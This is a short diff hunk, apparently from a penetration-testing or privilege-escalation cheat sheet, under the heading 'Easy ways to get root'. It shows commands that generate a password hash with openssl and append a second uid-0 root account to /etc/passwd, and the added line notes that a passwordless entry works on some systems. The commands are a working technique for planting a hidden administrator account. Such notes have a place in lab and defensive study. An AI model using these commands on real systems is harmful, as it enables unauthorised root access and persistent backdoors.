@@ -21,6 +21,7 @@
 
 ### Easy ways to get root
 #### 1. Cat a new root user entry to /etc/passwd
+- Also possible to do no passwordo on some systems!
 ```
 openssl passwd <PASS> #generate password
 echo "root2:<OPENSSL OUTPUT>:0:0:root:/root:/bin/bash" >> /etc/passwd
